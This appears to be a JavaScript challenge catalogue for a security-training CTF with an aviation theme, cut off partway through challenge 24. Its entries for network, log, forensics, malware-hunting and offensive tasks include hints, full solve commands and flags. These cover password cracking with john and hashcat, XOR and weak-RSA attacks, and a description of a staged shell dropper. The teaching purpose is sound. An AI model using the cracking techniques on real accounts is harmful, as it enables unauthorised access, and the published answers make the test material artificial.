// Challenge catalogue for the Avians practice CTF.
// Files live under ../challenges/<id>/ when served from a web server.
window.CATEGORIES = [
  { id: "preflight", name: "Pre-flight", blurb: "Kali basics: identify, decode and search files. Start here." },
  { id: "network",   name: "Network",    blurb: "Packet captures with Wireshark and tshark." },
  { id: "logs",      name: "Logs",       blurb: "grep, awk, sort, uniq, jq: the daily grind of a SOC analyst." },
  { id: "avionics",  name: "Aviation",   blurb: "ADS-B, transponders, ACARS and GNSS: the aviation-specific data." },
  { id: "forensics", name: "Forensics",  blurb: "Metadata, hidden data, password cracking." },
  { id: "hunt",      name: "Hunt / RE",  blurb: "Malware triage, YARA, reverse engineering and persistence hunting." },
  { id: "offensive", name: "Offensive",  blurb: "Break it: classic crypto, web tokens, reverse engineering and binary exploitation." }
];

window.CHALLENGES = [
{
  id:"01-boarding-pass", cat:"preflight", title:"Boarding Pass", diff:1, points:50,
  files:["boarding_pass.txt"],
  story:"Welcome aboard. Your boarding pass carries a “security code” that looks like gibberish. It is encoded, not encrypted — no key needed to reverse it.",
  question:"Decode the security code to get your first flag.",
  tools:[
    {name:"base64", why:"Built-in decoder on every Linux.", cmd:"echo 'CODE' | base64 -d"},
    {name:"CyberChef", why:"Browser 'Swiss-army knife' for decoding. Offline copy: sudo apt install cyberchef", cmd:"drag in the 'From Base64' block"}
  ],
  learn:"Encoding (Base64, hex, URL-encoding) only changes how data looks; anyone can reverse it. Base64 uses A-Z a-z 0-9 + / and often ends in one or two '=' signs. You will see it everywhere in logs, traffic and malware.",
  hints:["Open it: cat boarding_pass.txt","The string ends with '=' — the classic Base64 padding tell.","Pipe just the code into: base64 -d"],
  solve:"grep -A1 'SECURITY CODE' boarding_pass.txt | tail -1 | tr -d ' ' | base64 -d"
},
{
  id:"02-mystery-cargo", cat:"preflight", title:"Mystery Cargo", diff:1, points:50,
  files:["cargo_manifest.pdf"],
  story:"Customs sent a “PDF” cargo manifest, but no PDF reader will open it.",
  question:"Work out what the file really is, open it, and read the inspector reference.",
  tools:[
    {name:"file", why:"Identifies a file by its content (magic bytes), ignoring the extension.", cmd:"file cargo_manifest.pdf"},
    {name:"xxd", why:"Hex dump — see the magic bytes yourself.", cmd:"xxd cargo_manifest.pdf | head"},
    {name:"unzip", why:"Lists/extracts ZIP archives regardless of extension.", cmd:"unzip -l cargo_manifest.pdf"}
  ],
  learn:"Extensions are just part of the name. Real types are set by magic bytes: %PDF for PDF, 'PK' (50 4B) for ZIP, \\x89PNG for PNG, MZ for Windows EXE, \\x7fELF for Linux binaries.",
  hints:["Run: file cargo_manifest.pdf","It is really a ZIP archive.","unzip it, then read the files in the cargo/ folder."],
  solve:"file cargo_manifest.pdf\nunzip cargo_manifest.pdf -d out && cat out/cargo/*.txt"
},
{
  id:"03-fmc-firmware", cat:"preflight", title:"Strings Attached", diff:1, points:75,
  files:["fmc_firmware.bin"],
  story:"A Flight Management Computer firmware image from a test bench. A developer may have left a debug password inside.",
  question:"Find the debug password. One string looks like a flag but is cut off — that one is a decoy.",
  tools:[
    {name:"strings", why:"Prints readable text runs inside a binary.", cmd:"strings fmc_firmware.bin | less"},
    {name:"grep", why:"Filters the output.", cmd:"strings fmc_firmware.bin | grep -i password"}
  ],
  learn:"Binaries still contain readable text: error strings, paths, URLs, sometimes credentials. 'strings' is always an early move on an unknown file. Use 'strings -n 8' to cut noise.",
  hints:["strings prints a lot — pipe into grep.","Search for 'password', or for the flag prefix AVIANS{","strings fmc_firmware.bin | grep -iE 'password|avians'"],
  solve:"strings fmc_firmware.bin | grep -iE 'password|AVIANS'   # take the complete AVIANS{...} line"
},
{
  id:"04-ftp-ground-ops", cat:"network", title:"Ground Ops FTP", diff:1, points:100,
  files:["ground_ops.pcap"],
  story:"The fuel team still uploads uplift sheets over plain FTP. Here is a capture from the ground-ops VLAN.",
  question:"What password did the user log in with? Submit as AVIANS{password}.",
  tools:[
    {name:"Wireshark", why:"Open the pcap, filter, and follow streams.", cmd:"wireshark ground_ops.pcap &"},
    {name:"tshark", why:"Wireshark on the command line.", cmd:"tshark -r ground_ops.pcap -Y ftp"}
  ],
  learn:"FTP, Telnet and HTTP send everything in clear text. In Wireshark the display-filter bar is your main tool: type a protocol (ftp, http, dns) or an expression (ip.addr==10.10.5.21). Right-click → Follow → TCP Stream reads the whole conversation.",
  hints:["Filter the capture with: ftp","FTP sends USER then PASS.","Filter: ftp.request.command==\"PASS\"  (or Follow TCP Stream)"],
  solve:"tshark -r ground_ops.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg"
},
{
  id:"05-manifest-exfil", cat:"network", title:"Manifest Exfiltration", diff:2, points:150,
  files:["terminal_b_workstation.pcap"],
  story:"DLP fired on a check-in desk in Terminal B: a passenger manifest may have been uploaded to an outside site.",
  question:"Recover the uploaded file and the marker row the tool left inside it.",
  tools:[
    {name:"Export Objects", why:"Rebuilds files sent over HTTP.", cmd:"File → Export Objects → HTTP"},
    {name:"Statistics", why:"Conversations shows who talked to whom.", cmd:"Statistics → Conversations → IPv4"},
    {name:"tshark", why:"List HTTP requests quickly.", cmd:"tshark -r terminal_b_workstation.pcap -Y http.request -T fields -e ip.dst -e http.host -e http.request.method"}
  ],
  learn:"For exfil, start with the big picture: which internal host talks to which external IP, and how much leaves. Internal 10.x traffic is usually fine; a POST to an unknown domain is the red flag. Export Objects recovers the actual file so you can say what data left.",
  hints:["Statistics → Conversations → which peer is outside 10.0.0.0/8?","Filter: http.request.method==\"POST\"","Export Objects → HTTP, save the CSV, then grep AVIANS"],
  solve:"tshark -r terminal_b_workstation.pcap -Y 'http.request.method==\"POST\"' -T fields -e ip.dst -e http.host\nmkdir ex && tshark -r terminal_b_workstation.pcap --export-objects http,ex && grep -r AVIANS ex"
},
{
  id:"06-dns-contrails", cat:"network", title:"DNS Contrails", diff:3, points:200,
  files:["crew_lounge_dns.pcap"],
  story:"A crew-lounge machine is making odd DNS lookups. Firewalls let DNS through, so attackers use it to smuggle data out.",
  question:"Reassemble the data that was tunnelled out over DNS.",
  tools:[
    {name:"Wireshark", why:"Filter DNS and inspect query names.", cmd:"dns.flags.response==0"},
    {name:"tshark + coreutils", why:"Extract and stitch the pieces.", cmd:"tshark -r crew_lounge_dns.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name"},
    {name:"xxd -r -p", why:"Hex back to bytes.", cmd:"echo 41564941 | xxd -r -p"}
  ],
  learn:"DNS tunnelling hides data in the subdomain: <data>.<seq>.evil.com. Tells: long/random subdomains, many unique names under one domain, odd record types (TXT), high query volume from one host.",
  hints:["List queried names; find one domain with many random subdomains.","Domain is cdn-weather-update.net; each name is <hexchunk>.<seq>.cdn-weather-update.net","Sort by the sequence number, keep the first label, join, then hex-decode."],
  solve:"tshark -r crew_lounge_dns.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | grep cdn-weather-update.net | sort -u | sort -t. -k2,2n | cut -d. -f1 | tr -d '\\n' | xxd -r -p; echo"
},
{
  id:"07-radar-sweep", cat:"network", title:"Radar Sweep", diff:2, points:150,
  files:["baggage_ot_segment.pcap"],
  story:"The baggage system's OT network was port-scanned from the internet. You need who scanned and what they found open.",
  question:"Submit AVIANS{scanner_ip:open_port}, e.g. AVIANS{192.0.2.1:22}.",
  tools:[
    {name:"Statistics → Conversations", why:"One IP hitting hundreds of ports stands out.", cmd:"Statistics → Conversations → TCP"},
    {name:"TCP-flag filter", why:"SYN = attempt, SYN+ACK = open, RST = closed.", cmd:"tcp.flags.syn==1 && tcp.flags.ack==1"},
    {name:"nmap", why:"Run a SYN scan yourself in a lab to see the same pattern.", cmd:"sudo nmap -sS 127.0.0.1"}
  ],
  learn:"A SYN scan sends SYN to many ports: open answers SYN/ACK, closed answers RST, filtered stays silent. Port 502 is Modbus/TCP — used to talk to PLCs in baggage and building systems. Other OT ports: 102 (S7), 20000 (DNP3), 44818 (EtherNet/IP), 47808 (BACnet).",
  hints:["Statistics → Endpoints → which external IP sent the most packets?","Find the open reply: tcp.flags.syn==1 && tcp.flags.ack==1","Ignore the normal 443 sessions from 10.40.0.200; look only at replies to the scanner."],
  solve:"tshark -r baggage_ot_segment.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==1 && ip.dst==203.0.113.66' -T fields -e ip.src -e tcp.srcport"
},
{
  id:"08-brute-force-at-the-gate", cat:"logs", title:"Brute Force at the Gate", diff:1, points:100,
  files:["auth.log"],
  story:"The flight-planning server takes SSH from the internet and gets hammered daily. Did anyone actually get in?",
  question:"Which IP logged in with a password after brute-forcing, and as which user? Submit AVIANS{ip_username}.",
  tools:[
    {name:"grep", why:"Find matching lines.", cmd:"grep 'Failed password' auth.log"},
    {name:"awk | sort | uniq -c", why:"Count by field — the classic pipeline.", cmd:"grep Failed auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn"},
    {name:"less", why:"Scroll big files (/ to search).", cmd:"less auth.log"}
  ],
  learn:"On Debian/Kali SSH logs go to /var/log/auth.log. Watch for 'Failed password', 'Invalid user', 'Accepted password', 'Accepted publickey'. A brute-force success = many failures from one IP, then an Accepted from that same IP. Always check what came next (sudo, wget, new users).",
  hints:["Successful logins say 'Accepted'. grep for it.","Most Accepted lines are 'publickey' from internal 10.x — normal. Find 'Accepted password'.","Count failures from that IP, then read the lines just after the login."],
  solve:"grep Accepted auth.log | grep -v publickey\ngrep -c 198.51.100.23 auth.log\ngrep -A3 'Accepted password' auth.log"
},
{
  id:"09-booking-site-sqli", cat:"logs", title:"Booking Site Injection", diff:2, points:150,
  files:["access.log"],
  story:"The public flight-status page threw 500 errors this afternoon. The web team suspects SQL injection.",
  question:"Which database table did the attacker dump in the end? Submit AVIANS{table_name}.",
  tools:[
    {name:"awk | sort | uniq -c", why:"Top talkers by IP.", cmd:"awk '{print $1}' access.log | sort | uniq -c | sort -rn | head"},
    {name:"grep patterns", why:"UNION, SELECT, information_schema, sqlmap.", cmd:"grep -iE 'union|select|sqlmap' access.log"},
    {name:"URL-decode", why:"Payloads are percent-encoded; decode to read them.", cmd:"python3 -c 'import sys,urllib.parse as u;[print(u.unquote(l),end=\"\") for l in sys.stdin]'"}
  ],
  learn:"Combined log format: IP - - [time] \"METHOD /path HTTP/1.1\" status bytes \"ref\" \"user-agent\". SQLi usually goes: break with a quote (500), count columns (ORDER BY), list tables via information_schema, then dump the target table. A big jump in response size means data came back; the user-agent often names the tool (sqlmap).",
  hints:["Who sends %27 (a quote)? Check the user-agent column too.","grep sqlmap, then URL-decode those lines.","The final request has the largest response size (column 10); its FROM clause names the table."],
  solve:"grep -i sqlmap access.log | python3 -c 'import sys,urllib.parse as u;[print(u.unquote(l),end=\"\") for l in sys.stdin]'"
},
{
  id:"10-powershell-on-the-tarmac", cat:"logs", title:"PowerShell on the Tarmac", diff:2, points:200,
  files:["sysmon_gnd-ops-ws07.jsonl"],
  story:"A ground-ops Windows PC was beaconing out. You have its Sysmon process + network log as JSON, one event per line.",
  question:"Find the malicious PowerShell command, decode it, and read the operator note inside.",
  tools:[
    {name:"jq", why:"Command-line JSON: filter, select, count.", cmd:"jq -r .EventID sysmon_gnd-ops-ws07.jsonl | sort | uniq -c"},
    {name:"base64 + iconv", why:"PowerShell -enc is Base64 of UTF-16LE text.", cmd:"echo B64 | base64 -d | iconv -f utf-16le -t utf-8"},
    {name:"CyberChef", why:"From Base64 → Decode text (UTF-16LE).", cmd:"recipe: From Base64 + Decode text UTF-16LE"}
  ],
  learn:"Sysmon ID 1 = process creation (command line + parent), ID 3 = network connection. Red flags: powershell -enc / -nop / -w hidden, and Office apps (WINWORD.EXE) spawning powershell — the classic macro pattern. There is also a benign encoded command run by SYSTEM; decode both and tell them apart (avoiding false positives is the job too).",
  hints:["Filter ID 1 where CommandLine contains 'enc'.","Two encoded commands exist — check the ParentImage of each. Which parent is wrong for PowerShell?","Decode the last word of the WINWORD-spawned command: base64 -d | iconv -f utf-16le -t utf-8"],
  solve:"jq -r 'select(.ParentImage|test(\"WINWORD\")) | .CommandLine' sysmon_gnd-ops-ws07.jsonl | awk '{print $NF}' | base64 -d | iconv -f utf-16le -t utf-8"
},
{
  id:"11-ghost-flight", cat:"avionics", title:"Ghost Flight", diff:3, points:250,
  files:["adsb_capture_EBBR.txt","flight_plans.csv"],
  story:"ATC at Brussels sees an ADS-B target that matches no flight plan. ADS-B has no authentication — a cheap software radio can inject fake aircraft.",
  question:"Decode the raw capture and find the callsign with no flight plan. Submit AVIANS{CALLSIGN}.",
  tools:[
    {name:"pyModeS", why:"Decodes Mode S / ADS-B. Use a venv on Kali.", cmd:"python3 -m venv ~/ctfenv && . ~/ctfenv/bin/activate && pip install pyModeS"},
    {name:"Decode one", why:"Try a single message first.", cmd:"python3 -c \"import pyModeS as p;print(p.decode('8D4840D6202CC371C32CE0576098'))\""},
    {name:"dump1090", why:"The receiver that makes '*8D..;' lines from an RTL-SDR dongle.", cmd:"sudo apt install dump1090-mutability"}
  ],
  learn:"An ADS-B message is 112 bits = 28 hex chars. First byte 8D = Downlink Format 17. Next 6 hex = the aircraft's ICAO 24-bit address. Then 14 hex of payload whose first 5 bits are the Type Code (1-4 callsign, 9-18 position, 19 velocity), then a 6-hex CRC. Messages with a bad CRC are radio noise — pyModeS flags this as crc_valid.",
  hints:["Each line is: timestamp *HEX; — strip '*' and ';'.","Decode every line; keep only those with a callsign AND crc_valid==True.","Compare the callsigns you see against the callsign column of flight_plans.csv.","Some odd callsigns only appear in bad-CRC messages — those are noise, not the ghost."],
  solve:"# keep crc_valid callsigns, subtract the flight-plan set:\npython3 -c \"import csv,pyModeS as p;plans={r['callsign'] for r in csv.DictReader(open('flight_plans.csv'))};s=set();[s.add(d['callsign']) for d in (p.decode(l.split()[1].strip('*;')) for l in open('adsb_capture_EBBR.txt') if not l.startswith('#')) if d.get('crc_valid') and d.get('callsign')];print(s-plans)\""
},
{
  id:"12-supersonic-cessna", cat:"avionics", title:"Supersonic Cessna", diff:3, points:250,
  files:["adsb_capture_EBBR.txt","flight_plans.csv"],
  story:"Same capture. A second oddity: one aircraft reports a ground speed impossible for its type — a Cessna 172 cruises near 120 knots.",
  question:"Find the ICAO address reporting a supersonic ground speed. Submit AVIANS{ICAO} (6 hex chars).",
  tools:[
    {name:"pyModeS", why:"Type-code 19 messages decode to groundspeed, track, vertical_rate.", cmd:"import pyModeS as p; p.decode(msg)['groundspeed']"},
    {name:"flight_plans.csv", why:"Maps ICAO → aircraft type so you can judge plausibility.", cmd:"column -s, -t flight_plans.csv | less -S"}
  ],
  learn:"Spotting spoofed ADS-B is a plausibility game: speeds/climb rates a type can't do, jumping positions, ICAO not matching the registered type. Speed of sound is ~660 kt at altitude; airliners cruise 430-500 kt true, and a jet-stream tailwind can push ground speed past 600 kt — so don't flag a fast airliner as the spoof.",
  hints:["Decode all crc_valid messages that have a 'groundspeed'.","Keep the max groundspeed per ICAO and sort descending.","Anything above ~700 kt is the suspect; check its type in flight_plans.csv."],
  solve:"python3 -c \"import pyModeS as p;b={};[b.__setitem__(d['icao'],max(b.get(d['icao'],0),d['groundspeed'])) for d in (p.decode(l.split()[1].strip('*;')) for l in open('adsb_capture_EBBR.txt') if not l.startswith('#')) if d.get('crc_valid') and d.get('groundspeed')];print(sorted(b.items(),key=lambda x:-x[1])[:3])\""
},
{
  id:"13-squawk-alert", cat:"avionics", title:"Squawk Alert", diff:1, points:100,
  files:["transponder_log.csv"],
  story:"A decoded transponder log from approach radar. Three aircraft set special squawk codes; only one is a security incident.",
  question:"Which callsign is signalling unlawful interference (hijack)? Submit AVIANS{CALLSIGN}.",
  tools:[
    {name:"cut / awk", why:"Pull CSV columns.", cmd:"cut -d, -f3,4 transponder_log.csv | sort -u"},
    {name:"grep -E", why:"Match several codes at once.", cmd:"grep -E ',(7500|7600|7700),' transponder_log.csv"}
  ],
  learn:"Squawk codes are 4 octal digits set on the transponder. The three to know: 7500 = unlawful interference (hijack), 7600 = radio failure, 7700 = general emergency. (7000 = VFR conspicuity, 2000 = entering an SSR area.) Octal means any digit 8 or 9 is invalid — a handy check for faked data.",
  hints:["The emergency codes are 7500 / 7600 / 7700. Which is hijack?","grep ',7500,' transponder_log.csv"],
  solve:"grep -E ',(7500|7600|7700),' transponder_log.csv | awk -F, '{print $3,$4}' | sort -u"
},
{
  id:"14-acars-chatter", cat:"avionics", title:"ACARS Chatter", diff:2, points:150,
  files:["acarsdec_131725.log"],
  story:"ACARS is the plain-text datalink between aircraft and airline ops, carried over VHF in the clear. This log came off an SDR. One free-text message looks odd.",
  question:"Find the strange message and decode it.",
  tools:[
    {name:"grep -B -A", why:"Show context around a match.", cmd:"grep -B4 -A1 FREETEXT acarsdec_131725.log"},
    {name:"tr (ROT13)", why:"Shift letters by 13.", cmd:"tr 'A-Za-z' 'N-ZA-Mn-za-m'"},
    {name:"CyberChef", why:"ROT13, or 'Magic' to guess the scheme.", cmd:"ROT13 / Magic"}
  ],
  learn:"ACARS carries OOOI times, weather, gate info, maintenance codes and free text, mostly unencrypted — treat anything sent over it as public. The Label field gives the message type (H1 cockpit terminal, Q0 link test, 80 OOOI). Defenders watch for odd labels, unknown registrations and sensitive data leaking.",
  hints:["Most texts repeat; find the one that appears only once.","Look at the FREETEXT line: NIVNAF{..} — what shift turns NIVNAF into AVIANS?","ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m'"],
  solve:"grep FREETEXT acarsdec_131725.log | tr 'A-Za-z' 'N-ZA-Mn-za-m'"
},
{
  id:"15-gnss-spoofing", cat:"avionics", title:"GNSS Spoofing", diff:3, points:250,
  files:["fdr_gnss_SNX2405.nmea"],
  story:"GPS spoofing and jamming are a daily problem over parts of Europe. Flight SNX2405's GPS receiver log (NMEA) was pulled after the crew reported a position jump and nav warnings.",
  question:"At what UTC time (HHMMSS) was the first spoofed fix recorded? Submit AVIANS{HHMMSS}.",
  tools:[
    {name:"grep + cut", why:"NMEA is comma-separated; GGA has time, lat, lon, sats, HDOP, altitude.", cmd:"grep GPGGA fdr_gnss_SNX2405.nmea | cut -d, -f2-10 | head"},
    {name:"awk / Python", why:"Compare each fix to the previous and flag big jumps.", cmd:"awk -F, '/GPGGA/{...}'"},
    {name:"GPSBabel", why:"Convert to KML/GPX to view the track on a map.", cmd:"gpsbabel -i nmea -f ...nmea -o kml -F track.kml"}
  ],
  learn:"$GPGGA,hhmmss.ss,lat,N/S,lon,E/W,fix,sats,hdop,alt,... Spoofing tells: a sudden position jump no aircraft could fly, altitude or speed snapping to zero mid-flight, suspiciously perfect signal (more sats, lower HDOP), or a time jump.",
  hints:["Print time, lat, sats and altitude from every GGA line and scroll — something changes abruptly.","Watch the moment the satellite count and altitude change.","Print the first line where latitude jumps more than 0.1° from the previous fix."],
  solve:"awk -F, '/GPGGA/{lat=substr($3,1,2)+substr($3,3)/60; if(p&&(lat-p>0.1||p-lat>0.1)){print \"jump at\",$2;exit} p=lat}' fdr_gnss_SNX2405.nmea"
},
{
  id:"16-cockpit-selfie", cat:"forensics", title:"Cockpit Selfie", diff:1, points:75,
  files:["final_approach_25L.png"],
  story:"A first officer posted a “harmless” approach photo in a public group. Photos carry more than pixels.",
  question:"Read the image's metadata.",
  tools:[
    {name:"exiftool", why:"Reads metadata (EXIF, XMP, PNG text) from almost any file.", cmd:"exiftool final_approach_25L.png"},
    {name:"strings", why:"Quick and dirty — metadata is usually plain text.", cmd:"strings final_approach_25L.png | head"}
  ],
  learn:"Photos often carry camera model, software, GPS coordinates, timestamps and author names. OSINT gold; a leak risk for defenders. Strip it before publishing: exiftool -all= file.jpg",
  hints:["exiftool final_approach_25L.png","Look at the Comment field."],
  solve:"exiftool final_approach_25L.png | grep -iE 'author|comment|description'"
},
{
  id:"17-stowaway", cat:"forensics", title:"Stowaway", diff:2, points:125,
  files:["cargo_hold_cam.png"],
  story:"A cargo-hold camera snapshot is far too large for a 320×200 image. Something is hiding inside.",
  question:"Find and extract the stowaway.",
  tools:[
    {name:"binwalk", why:"Scans for embedded files/signatures and extracts them.", cmd:"binwalk cargo_hold_cam.png"},
    {name:"binwalk -e", why:"Extract what it found.", cmd:"binwalk -e cargo_hold_cam.png"},
    {name:"unzip", why:"ZIP tools read the archive directory from the end of a file.", cmd:"unzip -l cargo_hold_cam.png"}
  ],
  learn:"Appending a ZIP after a PNG is the simplest hiding trick: image viewers stop at the PNG's IEND marker, ZIP tools read from the end. binwalk finds embedded files by magic bytes. True pixel steganography needs steghide / zsteg / stegseek.",
  hints:["binwalk cargo_hold_cam.png — what sits after the PNG?","binwalk -e, then look in the extracted folder.","Shortcut: unzip cargo_hold_cam.png"],
  solve:"binwalk cargo_hold_cam.png\nunzip -o cargo_hold_cam.png && cat stowaway/README.txt"
},
{
  id:"18-locked-flight-bag", cat:"forensics", title:"Locked Flight Bag", diff:2, points:150,
  files:["flight_bag.zip"],
  story:"A password-protected ZIP from a pilot's Electronic Flight Bag. The password is weak and aviation-themed.",
  question:"Crack the ZIP and read the note inside.",
  tools:[
    {name:"zip2john + john", why:"Pull the hash from the ZIP, crack with a wordlist.", cmd:"zip2john flight_bag.zip > z.hash; john --wordlist=aviation_wordlist.txt z.hash"},
    {name:"fcrackzip", why:"Dictionary (or brute) attack straight on the ZIP.", cmd:"fcrackzip -D -p aviation_wordlist.txt -u flight_bag.zip"}
  ],
  learn:"Weak passwords fall to a dictionary attack: hash the target, then try every word. John the Ripper and hashcat are the standard crackers; the *2john helpers (zip2john, rar2john, ssh2john) turn many formats into crackable hashes. The wordlist is in challenges/_shared/aviation_wordlist.txt.",
  hints:["Get the hash: zip2john flight_bag.zip > z.hash","Crack with the shared aviation wordlist via john.","Once john prints the password, unzip -P <password> flight_bag.zip"],
  solve:"zip2john flight_bag.zip > z.hash\njohn --wordlist=challenges/_shared/aviation_wordlist.txt z.hash\njohn --show z.hash   # then: unzip -P <pw> flight_bag.zip && cat EFB_notes.txt"
},
{
  id:"19-crew-hashes", cat:"forensics", title:"Crew Hashes", diff:2, points:175,
  files:["crew_accounts.hashes"],
  story:"A dump from the crew portal database: usernames and unsalted MD5 password hashes. Some passwords are weak, some are strong.",
  question:"Crack the weak passwords. The flag is one crew member's recovered password, wrapped as AVIANS{password}.",
  tools:[
    {name:"john", why:"Auto-detects the hash type and cracks with a wordlist.", cmd:"john --format=raw-md5 --wordlist=aviation_wordlist.txt crew_accounts.hashes"},
    {name:"hashcat", why:"GPU cracker; mode 0 = MD5.", cmd:"hashcat -m 0 -a 0 crew_accounts.hashes aviation_wordlist.txt"},
    {name:"hash-identifier", why:"Confirm the hash type first.", cmd:"hashid '<hash>'"}
  ],
  learn:"Unsalted MD5 is near-worthless for passwords: identical passwords give identical hashes and billions can be tried per second. Lesson for the defence side: salt + a slow algorithm (bcrypt/argon2). The file is user:hash; strip comments before cracking. Strong random passwords in the dump will not crack — that is expected.",
  hints:["The file has '#' comment lines and user:hash rows.","These are raw MD5. Crack with john --format=raw-md5 and the aviation wordlist.","john --show reveals which users cracked; one of the recovered passwords is the flag."],
  solve:"grep -v '^#' crew_accounts.hashes > h.txt\njohn --format=raw-md5 --wordlist=challenges/_shared/aviation_wordlist.txt h.txt\njohn --format=raw-md5 --show h.txt"
},
{
  id:"20-baggage-dropper", cat:"hunt", title:"Baggage Dropper", diff:3, points:200,
  files:["bhs_update.sh.txt"],
  story:"A “firmware updater” script for the baggage conveyor system was found on a server. It is obfuscated. Read it — do NOT run it.",
  question:"Safely de-obfuscate the script and recover the hidden key from stage two.",
  tools:[
    {name:"cat / less", why:"Read the script first. Never execute unknown code.", cmd:"cat bhs_update.sh.txt"},
    {name:"rev / base64 -d / gunzip", why:"Undo each layer by hand instead of running it.", cmd:"echo DATA | rev | base64 -d | gunzip"},
    {name:"a throwaway VM", why:"If you must detonate, do it in an isolated snapshot with no network.", cmd:"(analysis VM only)"}
  ],
  learn:"Malware hides its payload in layers: here a reversed, Base64, gzipped blob piped into bash. The safe method is static analysis — peel each layer manually and read it, never pipe the final stage into a shell. Notice the end result writes a cron job and phones home to a C2 domain.",
  hints:["Read the script. It takes a variable, reverses it, base64-decodes, gunzips, then runs it with bash.","Do the same steps by hand but end at 'gunzip' instead of 'bash'.","echo \"$_a\" | rev | base64 -d | gunzip   (grab _a from the file)"],
  solve:"grep -o '_a=\"[^\"]*\"' bhs_update.sh.txt | cut -d'\"' -f2 | rev | base64 -d | gunzip"
},
{
  id:"21-yara-hunt", cat:"hunt", title:"Jackal Hunt (YARA)", diff:3, points:225,
  files:["threat_intel_report.txt","samples/"],
  story:"CTI handed you an intel report on the “JackalLoader” implant and 50 quarantined binaries from the baggage servers. Find the one real sample.",
  question:"Write a YARA rule from the report's indicators and find the matching sample. Submit AVIANS{sample_NN}.",
  tools:[
    {name:"yara", why:"Pattern-matches files against rules (strings + conditions).", cmd:"yara jackal.yar challenges/21-yara-hunt/samples/"},
    {name:"grep -r", why:"A quick cross-check for one indicator.", cmd:"grep -rl 'AVX-Tower-Mutex-7741' samples/"}
  ],
  learn:"YARA is how analysts turn intel into detection. A rule has a strings: section (text or hex) and a condition:. The report says a sample is JackalLoader only if BOTH indicators are present — so the condition is 'all of them', not 'any'. One decoy has only the mutex, another has a near-miss mutex string; the 'both' condition rules them out.",
  hints:["Two indicators: the ASCII mutex Global\\AVX-Tower-Mutex-7741 and the hex bytes DE AD C0 DE 7A 11 F1 A9.","Write a rule with both strings and condition: all of them","yara jackal.yar samples/  — exactly one file should match."],
  solve:"cat > jackal.yar <<'EOF'\nrule JackalLoader {\n  strings:\n    $mutex = \"Global\\\\AVX-Tower-Mutex-7741\"\n    $cfg = { DE AD C0 DE 7A 11 F1 A9 }\n  condition:\n    all of them\n}\nEOF\nyara jackal.yar challenges/21-yara-hunt/samples/"
},
{
  id:"22-persistence-hunt", cat:"hunt", title:"Persistence Hunt", diff:3, points:250,
  files:["metar-srv02_triage.tar.gz"],
  story:"A weather (METAR) server was compromised. You have a triage tarball of key system files. The attacker left several ways back in.",
  question:"Hunt for the persistence mechanisms. Collect the flag split across three artifacts (cron, a systemd service, an SSH key).",
  tools:[
    {name:"tar", why:"Extract the triage snapshot.", cmd:"tar xzf metar-srv02_triage.tar.gz"},
    {name:"grep -r", why:"Sweep for base64, odd build-ids, suspicious key comments.", cmd:"grep -rE 'base64|part' metar-srv02/"},
    {name:"eyes", why:"Read passwd for UID-0 extras, cron.d dotfiles, reverse-shell services, authorized_keys.", cmd:"cat metar-srv02/etc/passwd"}
  ],
  learn:"Linux persistence lives in a handful of well-known spots: cron (/etc/crontab, /etc/cron.d, hidden .files), systemd units (ExecStart running a shell/reverse shell), extra UID-0 accounts in /etc/passwd, and rogue keys in ~/.ssh/authorized_keys. Triage = check each spot. The flag's three parts hide in a cron base64 blob (part1), a systemd 'build-id' hex string (part2), and an SSH key comment (part3).",
  hints:["Extract, then look at etc/cron.d (including dotfiles), etc/systemd/system, and home/*/.ssh/authorized_keys.","part1: base64-decode the echo in etc/cron.d/.sys-health. part2: hex-decode the build-id comment in the sync .service. part3: read the comment on the second authorized_keys line.","Concatenate AVIANS{ part1 + part2 + part3 }."],
  solve:"tar xzf metar-srv02_triage.tar.gz\ngrep -oE '[A-Za-z0-9+/=]{20,}' metar-srv02/etc/cron.d/.sys-health | base64 -d            # part1\nsed -n 's/# build-id.*: //p' metar-srv02/etc/systemd/system/dbus-org.freedesktop.sync.service | xxd -r -p   # part2\ngrep -o 'part3=.*' metar-srv02/home/flightops/.ssh/authorized_keys                     # part3\n# combine: AVIANS{hunt_cron_systemd_and_ssh_keys}"
},
{
  id:"23-xor-atis", cat:"offensive", title:"Scrambled ATIS", diff:1, points:100,
  files:["atis_intercept.bin","note.txt"],
  story:"A VHF datalink broadcast was intercepted and saved raw. It is scrambled with a short repeating key — XOR, not real encryption.",
  question:"Recover the plaintext and read the flag inside it.",
  tools:[
    {name:"CyberChef", why:"'XOR Brute Force' tries single-byte keys; 'XOR' with a key decodes once you know it.", cmd:"XOR Brute Force / XOR"},
    {name:"xortool", why:"Guesses the key length and the most likely repeating key.", cmd:"xortool -c 20 atis_intercept.bin   (then xortool-xor -f file -s KEY)"},
    {name:"Python", why:"Once you guess the key, decoding is one line.", cmd:"bytes(b^key[i%len(key)] for i,b in enumerate(data))"}
  ],
  learn:"XOR with a repeating key is reversible with the same key — it is obfuscation, not encryption. If you can guess any part of the plaintext (a 'crib' like 'ATIS' or 'AVIANS{'), XOR it against the ciphertext at that position to leak the key. The key here is a short word; xortool or a crib will find it fast.",
  hints:["The plaintext is aviation radio text; it almost certainly starts with 'ATIS'. XOR that crib against the first bytes to recover the start of the key.","The key is a place you'd associate with Brussels airport, 8 letters, uppercase.","key = ZAVENTEM. Decode the whole file with it."],
  solve:"python3 -c \"d=open('atis_intercept.bin','rb').read();k=b'ZAVENTEM';import sys;sys.stdout.buffer.write(bytes(b^k[i%len(k)] for i,b in enumerate(d)))\""
},
{
  id:"24-weak-crew-pki", cat:"offensive", title:"Weak Crew PKI", diff:3, points:225,
  files:["pubkey_and_cipher.txt"],
  story:"The crew portal's 'secure token' service uses RSA, but someone generated the key badly: the two prime factors are far too close together.",
  question:"Factor the modulus, decrypt the ciphertext, and read the flag.",
  tools:[
    {name:"RsaCtfTool", why:"Throws every known weak-RSA attack at a key, including Fermat for close primes.", cmd:"RsaCtfTool --publickey key.pem --uncipher c   (or --n N --e E)"},
    {name:"Fermat factorisation", why:"When p and q are close, n factors almost instantly.", cmd:"start a=ceil(sqrt(n)); increase a until a²-n is a perfect square"},
    {name:"factordb", why:"Many small/weak moduli are already factored in the public database.", cmd:"http://factordb.com/  (paste n)"}
  ],
